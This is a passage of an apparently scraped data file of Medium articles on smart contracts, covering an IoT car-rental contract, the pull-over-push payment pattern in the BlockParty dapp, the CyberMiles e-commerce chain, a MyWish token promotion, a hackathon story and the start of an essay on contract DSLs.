returned, if it was not returned within the 24 hours period, we are not taking actions. What should happen if the rental period is over and the driver didn\u2019t return the car yet. Should the car, somehow, stop working? Should it prompt the driver to make a new payment? Should we have asked for a warranty before rental and kept the money on escrow? Should we blacklist the driver so they are not allowed to rent this car (or any other car in the network) ever?The car internals: The contract will need to know, at the very least, if the car need refueling. What would be the most efficient way for the car to communicate this? We are assuming the car has every kind of sensors that would allow it to get this data and in turn, forward this data to the smart contract.The way we assign the owners is suboptimal. First, we could have another entity, the car dealership for example, that upon receiving the money is authorized to call this function on the car smart contract to register the owners. Second, in this example, we are allowing owners to be set just once when the car is bought. How about letting a current owner buy another one out? What if we wanted someone else become owner of the car later on? Third, and this has to do in part with the fact that we are not allowing owners to own more shares of a car than others, if we have 3 owners they are getting 33% of the car each and the remaining 1% is held by the car itself, what should we do with that?\u00a0Finally, so far it doesn\u2019t even matter how much of the car someone owns as it is not being used to calculate the distribution of earnings. One more thing, maybe we don\u2019t even have to distribute the money the car earns according to ownership.As you can see, this articles raises a lot of questions for which I don\u2019t have the answers yet, but I hope it starts a debate on how the Ethereum blockchain is supposed to interact with IOT projects and the other way around.Feel free to share any suggestions or critics in the comments section below!", "responses": "1"}, {"title": "A SmartContract best practice: Push, Pull, or\u00a0Give?", "author_name": "makoto_inoue", "link": "https://medium.com/noblocknoparty/a-smartcontract-best-practice-push-pull-or-give-b2e8428e032a?source=search_post", "post_date": "Nov 19, 2017", "readtime": "4 min read", "upvotes": "102", "content": "A SmartContract best practice: Push, Pull, or\u00a0Give?makoto_inoueBlockedUnblockFollowFollowingNov 19, 2017In this post, I will talk about the trade off between writing secure smart contract and creating better user experiences. The blog post shows some code but hopefully it\u2019s understandable even if you don\u2019t write any code.How long does it take for you to withdraw the payout?The premise of my Dapp BlockParty is that \u201cYou will get deposit +more (aka. payout)if you attend\u201d.To receive the payout, however, you have to call the smart contract function withdraw(). You may be surprised how many people actually don\u2019t take their money back.The following chart shows how many days it takes for people to withdraw their payout. There have been nearly 100 people participated so far. Though more than half people withdrew within a day after the event was over, more than 10% of people didn\u2019t take within seven days (and there are still people who haven\u2019t taken the payout as I write this post).The longest time it took to withdraw was 281\u00a0daysWhy 7 days is important? Because the smart contract has a function called clear() which allows contract owner (me) to take all the left over and the default cooling period is set to 1 week\u00a0.You may ask \u201cWhy doesn\u2019t the contract just send back to all the participants when the event is over?\u201d.Pull Over PushGood question. That was actually my original implementation.\u201cReplace payback to use withdraw\u201d commitHowever this had 2 problems so I changed the implementation.Sending ether back to all the participants could run out of gas.Sending ether to unknown addresses could lead to security vulnerabilities.The second point is now best known as \u201cPull over Push\u201d pattern and advocated by reputable blockchain organisations such as OpenZeppelin and Consensys.Onward with Ethereum Smart Contract SecurityIf you\u2019re new to Ethereum development, I recommend you read our Hitchhiker\u2019s Guide to Smart Contracts in Ethereum\u2026blog.zeppelin.solutionsEvery Ether transfer implies potential code execution. The receiving address can implement a fallback function that can throw an error. Thus, we should never trust that a send call will execute without error. A solution: our contracts should favor pull over push for payments.Recommendations for Smart Contract Security in Solidity\ue3c9 This page demonstrates a number of solidity patterns which should generally be followed when writing smart contracts\u2026consensys.github.ioExternal calls can fail accidentally or deliberately. To minimize the damage caused by such failures, it is often better to isolate each external call into its own transaction that can be initiated by the recipient of the call. This is especially relevant for payments, where it is better to let users withdraw funds rather than push funds to them automatically. (This also reduces the chance of problems with the gas limit.) Avoid combining multiple send() calls in a single transaction.By following these best practices, I changed payback to simply mark who entitles the payout and introduced withdraw() function which allows participants to take the payout.However, now I have been getting different messages.It\u2019s true. Users should not really need to interact with smart contract more than they absolutely have to as people new to Smart contract tend to make mistakes.So I asked in the exit survey whether users want smart contract to send the money back (with extra admin cost) and here is the response(response rate is about 20%).I would say the result is a bit mixed. While over 50 % of people are up for the idea (26% yes + 15.8&5.3% yes if cheap), 30% of people rather do it by themselves.Share or Give?During Ethereum London November meetup, one of the participants also suggested something interesting.Instead of sharing the no show deposits among participants, what if we donate? That\u2019s actually a nice idea and I am a big fan of giving to a good cause (in fact my CodeUp asks participants to donate to local charity).However, I have a bit of concern that donating the no show deposits to charity actually weaken people\u2019s will to turn up because it goes to a good cause rather than random participants. Also, changing the payout distribution logic depending on events may dilute the unique and strong message BlockParty has.The alternative ideaThen I came up another idea. Rather than changing the payout() logic to share or give, why don\u2019t I change the clear() rule to take the money and send it back to a pre defined address. This can be either the participant\u2019s address or other addresses such as me (\u00a0:-) ) or charity address.This gives the maximum option for people to withdrawby themselves, admins to send the payout back (with fee), or give the money you are too lazy to take back to a good cause, while minimising the change on the smart contract itself.I am quite excited by the idea but would like to hear everybody\u2019s opinion before I go ahead and implement it. If you liked reading this post, I would appreciate if you can vote the following.", "responses": "1"}, {"title": "With a community-driven review system and a \u201csmart contract\u201d-managed ad platform, CyberMiles seeks to be the Ethereum of e-commerce", "author_name": "Mark Brinkerhoff", "link": "https://medium.com/cybermiles/with-a-community-driven-review-system-and-a-smart-contract-managed-ad-platform-cybermiles-seeks-f94b40b36627?source=search_post", "post_date": "Mar 2, 2018", "readtime": "4 min read", "upvotes": "51", "content": "With a community-driven review system and a \u201csmart contract\u201d-managed ad platform, CyberMiles seeks to be the Ethereum of e-commerceMark BrinkerhoffBlockedUnblockFollowFollowingMar 2, 2018Journalist: Lu Xiaoming \u2022 36kr.com \u2022 Blockchain\u5728\u533a\u5757\u94fe\u5e94\u7528\u5c42\u9762\uff0c\u7535\u5b50\u5546\u52a1\u662f\u4e0d\u5c11\u521b\u4e1a\u8005\u9009\u62e9\u843d\u5730\u7684\u573a\u666f\u3002\u6bd4\u5982\uff0c36\u6c2a\u66fe\u7ecf\u62a5\u9053\u8fc7\u53bb\u4e2d\u5fc3\u5316\u5206\u9500\u793e\u7fa4\u5e94\u7528Ecom Chain\uff0c\u8fd8\u6709\u7784\u51c6\u793e\u4ea4\u7535\u5546\u7684\u4fe1\u7528\u673a\u5236SEC\u3002\u672c\u6587\u8981\u4ecb\u7ecd\u7684CyberMiles\u5219\u51c6\u5907\u642d\u5efa\u53bb\u4e2d\u5fc3\u5316\u7684\u7535\u5b50\u5546\u52a1\u751f\u6001\u3002In the world of blockchain, e-commerce is where a growing number of entrepreneurs are choosing to leverage the technology. Reports from 36kr, a TechCrunch-like media outlet in China, point to the rise of decentralized distribution applications like Ecom Chain, as well as emerging social e-commerce credit systems. On the forefront of this global trend, CyberMiles, an in-development blockchain protocol designed and optimized for online marketplaces (such as 5miles), has announced its intention to build a fully-decentralized e-commerce ecosystem.CyberMiles\u662f\u4e00\u4e2a\u9488\u5bf9\u7535\u5546\u573a\u666f\u7684\u5e95\u5c42\u94fe\u53ca\u5176\u7ec4\u4ef6\uff0c\u5176\u5305\u62ec\u4e0d\u540c\u7c7b\u578b\u7684\u5546\u4e1a\u667a\u80fd\u5408\u7ea6\u6a21\u677f\u3002The mission of CyberMiles is to disrupt and improve the e-commerce infrastructure chain and its components with what CyberMiles refers to as \u201csmart business contracts.\u201d\u8fd9\u4e2a\u9879\u76ee\u7531\u7f8e\u56fd\u95f2\u7f6e\u7269\u54c1\u4ea4\u6613\u5e73\u53f05miles\u65d7\u4e0b5xlab\u5b9e\u9a8c\u5ba4\u4e8e2017\u5e748\u6708\u5e95\u63a8\u51fa\uff0cCyberMiles\u670912\u4e2a\u5927\u7c7b\uff0c371\u5c0f\u7c7b\u7684\u5546\u4e1a\u5408\u7ea6\u5b9a\u5236\u6a21\u7248\u3002This initiative was launched by 5miles\u2019 5xlab, a blockchain technology incubator from the research and development team behind the popular second-hand goods trading platform. Since launching in 2015, the 5miles marketplace has expanded to a dozen categories and more than 350 subcategories, integrating customized commercial contracts.\u521b\u59cb\u4eba\u5362\u4eae\u89e3\u91ca\uff0c\u53ef\u4ee5\u628aCyberMiles\u7406\u89e3\u4e3a\u7535\u5b50\u5546\u52a1\u7248\u7684\u201c\u4ee5\u592a\u574a\u201d\u3002\u4e0d\u8fc7\uff0c\u533a\u5757\u94fe\u5bf9\u4e8e\u7535\u5546\u884c\u4e1a\u6709\u4ec0\u4e48\u610f\u4e49\uff1f\u5362\u4eae\u8ba4\u4e3a\uff0c\u533a\u5757\u94fe\u53ef\u4ee5\u89e3\u51b3\u7535\u5546\u884c\u4e1a\u4ee5\u4e0b\u4e09\u4e2a\u75db\u70b9\uff1aAccording to Dr. Lucas Lu, C.E.O. of 5miles and a founding member of CyberMiles, the purpose of CyberMiles is to be an e-commerce version of the Ethereum blockchain. Why is blockchain technology needed in the e-commerce industry? Dr. Lu believes that CyberMiles can solve three significant barriers facing e-commerce.1\u3001\u6570\u636e\u548c\u4ea4\u6613\u7684\u900f\u660e\u6027\u548c\u53ef\u9760\u6027\u3002\u4f7f\u7528\u533a\u5757\u94fe\u4e4b\u540e\uff0c\u5546\u5bb6\u548c\u7528\u6237\u7684\u4ea4\u6613\u3001\u8bc4\u8bba\u7b49\u52a8\u4f5c\u5c06\u88ab\u8bb0\u5f55\u4e0b\u6765\u5e76\u516c\u5f00\uff0c\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u8bc6\u522b\u67d0\u4e70\u5bb6\u662f\u5426\u5237\u5355\uff0c\u5e97\u5bb6\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5220\u9664\u5dee\u8bc4\u7b49\u65b9\u5f0f\u6b3a\u7792\u987e\u5ba2\u3002\u67d0\u4e9b\u4e0d\u5fc5\u516c\u5f00\u7684\u6570\u636e\u4f1a\u505a\u8131\u654f\u5904\u7406\uff0c\u9690\u85cf\u7279\u5b9a\u5b57\u6bb5\u30021. The transparency and reliability of data and transactions. Marketplace customers are able to view transaction history, reviews, and other actions between businesses and customers, which can be recorded publicly thanks to blockchain technology. Sellers, meanwhile, are not allowed to delete negative comments or otherwise obscure customer feedback.2\u3001\u667a\u80fd\u5408\u7ea6+\u793e\u533a\u6cbb\u7406\u964d\u4f4e\u4e86\u8150\u8d25\u7684\u53ef\u80fd\u3002\u5728\u73b0\u6709\u7684\u7535\u5546\u4f53\u7cfb\u4e2d\uff0c\u5e7f\u544a\u8d44\u6e90\u5206\u53d1\u3001\u4ea4\u6613\u7ea0\u7eb7\u5904\u7406\u3001\u5e97\u94fa\u5ba1\u6838\u3001\u5c01\u53f7\u7b49\uff0c\u90fd\u7531\u6dd8\u5b9d\u7b49\u5e73\u53f0\u638c\u63e1\u3002\u5728CyberMiles\u94fe\u4e0a\uff0c\u5e7f\u544a\u8d44\u6e90\u901a\u8fc7\u667a\u80fd\u5408\u7ea6\u6765\u7ba1\u7406\uff0c\u5c01\u53f7\u3001\u4e0b\u67b6\u5546\u54c1\u3001\u5ba1\u6838\u5219\u901a\u8fc7\u968f\u673a\u9009\u53d6\u4ef2\u88c1\u8005\u6295\u7968\u7684\u65b9\u5f0f\u51b3\u5b9a\u3002\u7531\u4e8e\u6295\u7968\u9700\u8981\u6d88\u8017\u7279\u5b9a\u4ee3\u5e01\uff0c\u4ef2\u88c1\u8005\u5fc5\u987b\u662f\u4ee3\u5e01\u6301\u6709\u8005\u30022. Smart contracts, plus community management, reduce the risk of corruption. In today\u2019s e-commerce ecosystem, ad targeting, auditing, account management and transaction disputes all are managed by centralized platforms like eBay in the U.S. and Taobao in China. For CyberMiles, all the smart contract-managed ad resources, banned accounts and prohibited goods are arbitrated by a \u201creferee\u201d from within the community. Since the action requires tokens, a means of transaction within a decentralized marketplace application (think bitcoin), the arbiter in question must be a token holder.3\u3001\u964d\u4f4e\u5728\u7ebf\u652f\u4ed8\u6210\u672c\u3002\u5728\u7f8e\u56fd\uff0c\u79fb\u52a8\u652f\u4ed8\u7684\u624b\u7eed\u8d39\u53ef\u80fd\u9ad8\u8fbe3%\u3002\u7f8e\u56fd\u5e02\u573a\u5316\u7684\u94f6\u884c\u4f53\u7cfb\u5bfc\u81f4Paypal\u7b49\u7535\u5b50\u652f\u4ed8\u516c\u53f8\u9700\u8981\u4e0e\u6bcf\u5bb6\u94f6\u884c\u5bf9\u63a5\uff0c\u5728\u4e2d\u56fd\u5219\u4e0e\u63a5\u94f6\u8054\u5373\u53ef\uff1bVisa\u548cMastercard\u7b49\u4fe1\u7528\u5361\u8d70\u56fd\u9645\u7f51\u5173\uff0c\u8fd9\u4e24\u8005\u6210\u672c\u90fd\u4e0d\u4f4e\uff0c\u9020\u6210\u79fb\u52a8\u652f\u4ed8\u53d1\u5c55\u7f13\u6162\u3002\u4ed6\u8ba4\u4e3a\u6570\u5b57\u8d27\u5e01\u6709\u671b\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u4f20\u7edf\u7684\u5145\u503c\u4f53\u7cfb\u4e0b\u7684\u79ef\u5206\u53ea\u80fd\u5728\u5185\u90e8\u5e73\u53f0\u6d41\u8f6c\uff0c\u57fa\u4e8e\u533a\u5757\u94fe\u7684Token\u53ef\u8de8\u5e73\u53f0\uff0c\u751a\u81f3\u5347\u503c\u30023. Reduce the transaction costs of online payments. In the U.S., online payment fees may run three percent (or more). The traditional banking system requires electronic payment companies like PayPal to cooperate with each bank; in China, they must cooperate with the UnionPay. Popular credit cards, such as Visa and MasterCard, charge high transaction fees, in part due to the international gateway. The result has been a slow development of mobile payments. Dr. Lu believes that cryptocurrency is expected to disrupt this situation. While conventional tokens may be used only within a single platform (think \u201cstore credit\u201d), blockchain-based tokens will be used across many different e-commerce sites and online marketplaces, adding to their utility and ultimate appreciation as a decentralized digital currency.\u4e3a\u4e86\u6ee1\u8db3\u7535\u5b50\u5546\u52a1\u573a\u666f\u9ad8\u5e76\u53d1\u3001\u91cd\u5b89\u5168\u7b49\u9700\u6c42\uff0cCyberMiles\u8ba1\u5212\u5728\u4e09\u65b9\u9762\u505a\u4f18\u5316\uff1aIn order to meet the needs of e-commerce today (\u201chigh concurrency\u201d and serious data security threats, among others), CyberMiles is working to optimize e-commerce in three significant ways:1\u3001 \u9996\u5148\u662f\u63d0\u5347\u6027\u80fd\uff0c\u652f\u6301\u9ad8\u5e76\u53d1\u3002Visa\u6bcf\u79d2\u652f\u6301\u8d85\u8fc75\u4e07\u7b14\u4ea4\u6613\u3001\u652f\u4ed8\u5b9d\u652f\u6301\u8d85\u8fc78\u4e07\u7b14\uff0c\u5982\u6b64\u4ea4\u6613\u9891\u6b21\u5bf9\u4e8e\u6bcf\u79d225\u7b14\u7684\u4ee5\u592a\u574a\u6765\u8bf4\u7b80\u76f4\u8981\u5835\u762b\u3002CyberMiles\u5229\u7528\u4e86\u8d85\u7ea7\u8282\u70b9\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5b9e\u73b0\u5c0f\u89c4\u6a21\u5206\u5e03\u5f0f\u8bb0\u8d26\uff0c\u76ee\u524d\u6bcf\u79d2\u53ef\u652f\u6301\u4e00\u4e07\u7b14\u4ea4\u6613\u30021. Enhance performance and support for high concurrency. Visa, for example, processes more than 50,000 transactions per second, while in China, Alipay processes more than 80,000 transactions per second. Next to enormous trading frequency like this, Ethereum\u2019s comparatively glacial 25 transactions per second create an unprecedented traffic jam. CyberMiles takes advantage of super-node solutions to achieve small-scale distributed accounts, supporting upwards of 10,000 transactions per second.2\u3001\u5176\u6b21\u662f\u964d\u4f4e\u624b\u7eed\u8d39\u3002\u6bd4\u7279\u5e01\u548c\u4ee5\u592a\u574a\u7684\u5835\u585e\u5bfc\u81f4\u4ea4\u6613\u624b\u7eed\u8d39\u4e0a\u6da8\uff0c\u8fd9\u5bf9\u7535\u5546\u4ea4\u6613\u6765\u8bf4\u662f\u4e2a\u6c89\u91cd\u7684\u8d1f\u62c5\u3002CyberMiles\u5728\u5b9a\u4ef7\u4e0a\u5e0c\u671b\u80fd\u505a\u5230\u624b\u7eed\u8d39\u8d8b\u96f6\uff0c\u4f46\u662f\u4e3a\u4e86\u907f\u514d\u6076\u610f\u64cd\u4f5c\u4f1a\u5bfb\u627e\u5e73\u8861\u70b9\u30022. Reduce the transaction fees. What \u201ctraffic jams\u201d in the Bitcoin and Ethereum networks have done is cause transaction fees to rise\u200a\u2014\u200aa heavy toll on e-commerce activities. CyberMiles is aiming for transaction fees that are close to zero, balancing pricing with predictability.3\u3001\u7b2c\u4e09\u662f\u63d0\u9ad8\u5e73\u53f0\u5b89\u5168\u6027\u3002\u5f7b\u5e95\u4f9d\u9760\u53bb\u4e2d\u5fc3\u5316\u670d\u52a1\u5668\u7684IDC\u89e3\u51b3\u65b9\u6848\uff0c\u5176\u53ef\u9760\u6027\u548c\u53ef\u6269\u5c55\u6027\u96be\u4ee5\u83b7\u5f97\u4f01\u4e1a\u5ba2\u6237\u8ba4\u53ef\u3002CyberMiles\u4f7f\u7528\u5206\u5e03\u5f0f+\u5ba1\u6838\u7684\u673a\u5236\uff0c\u6301\u5e01\u8005\u9700\u8981\u7533\u8bf7\u3001\u5ba1\u6838\u901a\u8fc7\u540e\u624d\u80fd\u6210\u4e3a\u8282\u70b9\u3001\u53c2\u4e0e\u6316\u77ff\u3002\u5362\u4eae\u900f\u9732\uff0c\u672a\u6765\u5927\u578b\u77ff\u673a\u7531CyberMiles\u7edf\u4e00\u91c7\u8d2d\uff0c\u653e\u5728\u7b26\u5408\u8981\u6c42\u7684IDC\u673a\u623f\uff1b\u5c0f\u6563\u6237\u53ef\u4ee5\u91c7\u8d2d\u5c0f\u578b\u77ff\u673a\u6316\u77ff\uff0c\u4f46\u65e0\u6cd5\u53c2\u4e0e\u4ea4\u6613\u9a8c\u8bc1\u30023. Improve platform security. Relying solely on decentralized servers and/or international data center solutions may make enterprise acceptance difficult. CyberMiles will use decentralization and audit mechanisms, with token holders who need to apply and be validated in order to become a node and participate in mining activities. According to Dr. Lu, in the future, CyberMiles will purchase large mining machines, which will be placed in the qualified IDC room; while private investors can purchase small-scale mining machines, which contrastly will not be involved in the validation of transactions.\u5362\u4eae\u89e3\u91ca\uff0c\u5bf9\u77ff\u673a\u628a\u63a7\u90a3\u4e48\u4e25\u683c\uff0c\u8ddf\u9879\u76ee\u91c7\u7528\u7684DPOS\u5171\u8bc6\u673a\u5236\u6709\u5173\u3002DPOS\u8981\u6c42\u6301\u5e01\u8005\u5c06Token\u538b\u5728\u77ff\u673a\u4e2d\u6316\u77ff\uff0c\u56e0\u7b7e\u540d\u9700\u6c42\u79c1\u94a5\u4e5f\u5b58\u4e8e\u5176\u4e2d\uff0c\u8fd9\u610f\u5473\u7740\u77ff\u673a\u4e00\u65e6\u88ab\u76d7\u4ee3\u5e01\u5219\u968f\u4e4b\u5931\u7a83\u3002The reason why CyberMiles intends to control mining machines so strictly is because of the Delegated Proof of Stake (DPOS) consensus mechanism that has been adopted by CyberMiles\u2019 project leaders. DPOS requirements are such that token holders have to hold a token as essentially a mortgage in the mining machine while mining. What this means is that because DPOS requires storing a token and a private key in the mining machine, if/when the machine is stolen, the token belonging to the holder in question is lost as well.CyberMiles\u5e95\u5c42\u94fe\u8fd8\u5904\u4e8e\u5f00\u53d1\u9636\u6bb5\uff0c\u865a\u62df\u673a\u90e8\u5206\u5c06\u4e8e3\u6708\u4e0a\u7ebf\uff0c\u4e3b\u94fe\u5b8c\u5168\u4e0a\u7ebf\u4f1a\u57288\u6708\uff0c\u77ff\u673a\u4e5f\u4e8e\u5c4a\u65f6\u53d1\u5e03\u3002\u5728\u5408\u4f5c\u4f19\u4f34\u65b9\u9762\uff0c\u5362\u4eae\u8ba1\u5212\u5148\u8ddf\u4f20\u7edf\u7535\u5546\u5e73\u53f0\u5408\u4f5c\uff0c\u63d0\u9ad8\u4ea4\u6613\u989d\u548cToken\u6d41\u52a8\u6027\uff1b\u540c\u65f6\u4f18\u5148\u6311\u9009\u9ad8\u5e76\u53d1\u573a\u666f\u6253\u54c1\u724c\u3002\u76ee\u524d\u5408\u4f5c\u4f19\u4f34\u6709\u505a\u4e2d\u95f4\u4ef6\u7684ArcBlock\u3001\u7f8e\u56fd\u95f2\u7f6e\u7269\u54c1\u4ea4\u6613\u5e73\u53f05miles\uff0c\u8fd8\u6709\u4e00\u7f8e\u56fd\u4f01\u4e1a\u5f81\u4fe1\u6570\u636e\u516c\u53f8\u3002CyberMiles\u2019 infrastructure network is still in the development stage: the virtual machine part is expected to launch online in March, with main network anticipated to launch by August. (Mining machines, meanwhile, will be released around the same time.) Partnership-wise, Dr. Lu and his team plan to cooperate with traditional e-commerce platforms at the beginning, in order to increase the volume of trading and liquidity on CyberMiles. In the interim, CyberMiles has teamed up with ArcBlock, as well as the aforementioned 5miles.CyberMiles\u7684\u7814\u53d1\u56e2\u961f\u6709\u5341\u51e0\u4eba\u3002\u5362\u4eae\u8ba4\u4e3a\u56e2\u961f\u6700\u5927\u7684\u4f18\u52bf\u5728\u4e8e\u6df1\u539a\u7684\u7535\u5546\u4ece\u4e1a\u80cc\u666f\u548c\u5148\u53d1\u4f18\u52bf\uff0c\u6dd8\u5b9d\u3001\u4e9a\u9a6c\u900a\u7b49\u5927\u5e73\u53f0\u4e0d\u53ef\u80fd\u505a\u516c\u94fe\u6765\u9769\u81ea\u5df1\u7684\u547d\uff0c\u5176\u4ed6\u5e73\u53f0\u60f3\u505a\u9700\u8981\u65f6\u95f4\u8ffd\u8d76\u3002To that end, CyberMiles\u2019 boasts more than a dozen people on its research and development team. Dr. Lu believes that perhaps CyberMiles\u2019 greatest strength lies in the (collective) strong e-commerce business background and first-mover advantage. Amazon, Taobao, and other large, stable platforms are unlikely to use blockchain to reform their own ecosystem, but other, smaller platforms will have access to more innovative technology to help them gain ground.CEO&\u521b\u59cb\u4eba\u5362\u4eae\uff08Lucas Lu\uff09\u662f\u9ad8\u80fd\u7269\u7406\u5b66\u7684\u535a\u58eb\uff0c\u66fe\u7ecf\u5728\u4e92\u8054\u7f51\u7684\u53d1\u6e90\u5730\u6b27\u6d32\u6838\u5b50\u4e2d\u5fc3\u5de5\u4f5c\u8fc7\uff0c\u5e76\u53c2\u4e0e\u4e86\u5e0c\u683c\u65af\uff08\u4e0a\u5e1d\u7c92\u5b50\uff09\u7684\u7406\u8bba\u548c\u5b9e\u9a8c\u7814\u7a76\uff1b\u57282013\u5e74\u4e4b\u524d\u4ece\u4e8b\u8fc7\u6bd4\u7279\u5e01\u7684\u91cf\u5316\u4ea4\u6613\uff1b\u66fe\u4efb\u624b\u673a\u6dd8\u5b9d\u7b2c\u4e00\u4efb\u603b\u7ecf\u7406\uff0c \u534e\u6570\u6dd8\u5b9d\uff08\u5408\u8d44\uff09 \u603b\u7ecf\u7406\uff1b2011\u5e74\u4f5c\u4e3aCTO\u52a0\u5165\u5170\u4ead\u96c6\u52bf\uff0c\u5170\u4ead\u96c6\u52bf\u4e8e2013\u5e74\u4e0a\u5e02\uff1b2014\u5e74\u521b\u7acb5miles\u3002\u5362\u4eae\u900f\u9732\uff0c5miles\u62e5\u67091300\u4e07\u7528\u6237\u91cf\uff0c\u5e74\u4ea4\u6613\u989d\u8d85\u8fc730\u4ebf\u7f8e\u5143\u3002\u539f\u521b\u6587\u7ae0\uff0c\u4f5c\u8005\uff1a\u5362\u6653\u660e\u3002About Dr. Lucas Lu: cybermiles.io/team.html", "responses": ""}, {"title": "Smart Contracts run the Crypto World. Now it\u2019s time for the Neo Smart Contract.", "author_name": "Vladimir Tikhomirov", "link": "https://medium.com/@VladimirTikhomirov/smart-contracts-run-the-crypto-world-now-its-time-for-the-neo-smart-contract-bd75e973f23b?source=search_post", "post_date": "May 30, 2018", "readtime": "3 min read", "upvotes": "361", "content": "Smart Contracts run the Crypto World. Now it\u2019s time for the Neo Smart Contract.Vladimir TikhomirovBlockedUnblockFollowFollowingMay 30, 2018The World of Cryptocurrency was never a static phenomenon. Unlike our daily reality, it strives to the greatest possible usefulness and complete utilization of tokens powered by Blockchain technology. Smart Contracts become more available day by day, people with different crypto belief can find their personal way to secure their investments.Neo, is an open Network for Smart Economy, makes it possible to create Smart Contract written in C#, Java and Python programming languages. It can\u2019t be denied that this feature is pretty unique and admirable. But what if there are people out there who aren\u2019t capable of programming or just simply don\u2019t have time for a complex coding? MyWish Smart Contract Platform integrated the main principles of Neo to make Neo Token Smart Contract real, understandable and affordable for those who are interested. From now on Neo with the help of MyWish is providing you with the most reliable and secure ready for use Token Smart Contracts.NEO combines the structure of transactions and blocks of Bitcoin, PoS consensus and Turing Complete Smart Contracts. We couldn\u2019t miss such a possibility to work for this Platform. Before it was pretty hard to get a decent Smart Contract on NEO, due to the fact of some bugs refer to coding and so on. MyWish Smart Contract Platform made it real by creating a Token Sale Smart Contract and a Crowd Sale Smart Contract for them (in the next 2 weeks).Yet there are many more Blockchains out there which are definitely worth using and telling the World about. MyWish, as a strong believer in cryptocurrency, wants to give every existing Blockchain platform a chance to support Smart Contracts. We make out a statement that it\u2019s our mission since now. All of the Smart Contracts that we provide Blockchain platforms with, are ready to use. Our strong team of developers tests every single \u0421ontract for possible mistakes, and only then makes an official release. No need to mention that the code for Smart Contract is one of the most complex things in programming, that\u2019s exactly why you won\u2019t find many options which offer you to use a Smart Contract.Speaking of our mission, we had partnered with RSK and released the World first Smart Contract for Bitcoin holders. 2-Way-Peg technology that was used as a foundation, helped us made it real for the first time in the history of Smart Contracts.We will definitely keep you updated on our further steps. We do hope that soon you could feel safe and certain about your crypto deals on the Internet with the help of MyWish Smart Contract service.Our own token is called WISH, every single payment on our Smart Contract Platform is always made with the WISH (even if you pay by ETH we convert it to WISH). The more deals are made with the WISH token, the higher the value of this token.Hope you won\u2019t hesitate to try it out! https://contracts.mywish.io/Thank you for support!MyWish Team.", "responses": ""}, {"title": "Building decentralized reputation management as a smart\u00a0contract", "author_name": "Alex Beregszaszi", "link": "https://medium.com/@alexberegszaszi/building-decentralized-reputation-management-as-a-smart-contract-6d60b0c7bd0?source=search_post", "post_date": "Apr 29, 2016", "readtime": "4 min read", "upvotes": "33", "content": "Building decentralized reputation management as a smart\u00a0contractAlex BeregszasziBlockedUnblockFollowFollowingApr 29, 2016The story and future of Iudex, winner of the Ether.Camp hackathon.I\u2019ve met Thomas Bertani at the Dublin Blockchain Hackathon last November, just at the right time for us to form a team for the Hack.Ether.Camp Hackathon in December. I think hackathons can become an addiction after a while\u00a0:)Hack.Ether.Camp was a great experience\u200a\u2014\u200aa completely online hackathon where all coding was done in an online IDE anyone could inspect during or after the hack and where judges and the public could vote via an Ethereum contract. Kudos to Roman, the Iudex IDE is still available here.", "responses": ""}, {"title": "A Smart Contract Development Stack", "author_name": "Markus Voelter", "link": "https://languageengineering.io/a-smart-contract-development-stack-54533a3a503a?source=search_post", "post_date": "Dec 6, 2017", "readtime": "13 min read", "upvotes": "123", "content": "A Smart Contract Development StackBetter Abstractions for Correct Smart ContractsMarkus VoelterBlockedUnblockFollowFollowingDec 6, 2017Blockchains and Smart Contracts are one of the most intense hypes I have ever encountered, a close number two right after micro services\u00a0:-) Even the IHK Stuttgart, the local industry association, recently organised a Blockchain Camp, and around 200 people attended, many of them with no computer science background.Two Aspects of Smart ContractsFor me, the topic conceptually splits into two aspects. One is the non-functional properties provided by the Blockchain technology, such as trustworthiness and non-repudiability, as a consequence of the distributed nature of block processing and the involved math. Even though it builds on many established ideas and technologies (such as public key crypto), the approach is fundamentally new and interesting. Some of the particular technologies definitely need to change to approaches that are way less wasteful of energy though; Algorand looks very interesting, as well as Ethereum\u2019s native work on proof-of-stake in the context of Casper.The other aspects is the idea that non-programmers can specify, analyse, simulate and ultimately execute contracts. And I really mean contracts, i.e., processes where multiple involved parties make (a sequence of) decisions over time. The non-functional properties of blockchains can be beneficial here, but are not necessary\u200a\u2014\u200aif you trust a central entity, you can delegate the execution of the contract to that entity and use crypto to control who is allowed to do what as part of a contract. This second aspect is very much in line with the computerification of other non-technical domains such as computational law or computational governance. It is probably not a surprise to you, dear reader, that I consider this a very good use case for DSLs.Ethereum and\u00a0SolidityThe preeminent platform for executing smart contracts is Ethereum. Except for the energy issue, it is very suitable for providing the non-functional properties of blockchains I mentioned above. However, it falls short in the second aspect. The primary programming language for the Ethereum VM (EVM) is Solidity. It is essentially a general-purpose programming language with support for the specifics of programs that run on the blockchain. For example, running code on the distributed EVM costs money (Ether), and developers can limit the processing time used by a particular program in order to not run out of money. And every method that\u2019s called on a contract implicitly carries information about the sender (more specifically, their account number) so that the fee for a transaction can be paid by this account; the ID can also be used for authorisation of operations defined in the contract. However, Solidity (and the other Ethereum languages I have seen so far) does not provide first-class support for the typical patterns found in smart contracts that run on the blockchain, i.e., programs where a group of parties collaboratively make decisions and run processes. This is interesting, since the community has identified typical \u201ccontract patterns\u201d that are a good starting point for reification into language abstractions.An Architecture for Smart Contract DevelopmentThe following picture shows an overview of how I imagine a Smart Contract development environment to look like. Let\u2019s walk through the parts.The first realisation is that the overall problem can be broken down into the development of contracts and into its execution.Contract ExecutionConsidering that blockchain technology exists (and ignoring the energy challenge), execution is almost the simpler problem. Once you have implemented a contract correctly (!), you can deploy it to the blockchain and execute it there, benefiting from the guarantees provided by the blockchain (and maybe also suffering from some of its limitations, such as relatively low throughput, at least for now). Several different blockchain technologies exist; for example, in a business context, it seems that Hyperledger might be(come) more important than Ethereum. It doesn\u2019t have exactly the same properties or guarantees, but that is good: users can choose the properties they need. Notice, however, the exclamation point behind the \u201ccorrectly\u201d above. That is the crux!It is of course necessary that the infrastructure itself provides correctness guarantees. This is why various projects are under way to formally verify the virtual machine or enhance the solidity compiler to support advanced checking through integration with a solver. However, you can still implement the wrong behavior in your contract (which is then correctly executed by a verified VM). This is where the importance of the right contract development languages and tools come in.Contract DevelopmentIt\u2019s almost funny how often I have heard statements like, \u201cWell, contracts have to be correct, because, in contrast to other software, money is involved, and you don\u2019t want to lose that.\u201d True, of course, but if you\u2019re the developer of pace makers, you don\u2019t want to kill people because of bugs in your software. And if you develop satellites, you don\u2019t want it to die from a software bug on day two of the mission. So, ensuring the correctness of a program is relevant outside of smart contracts, 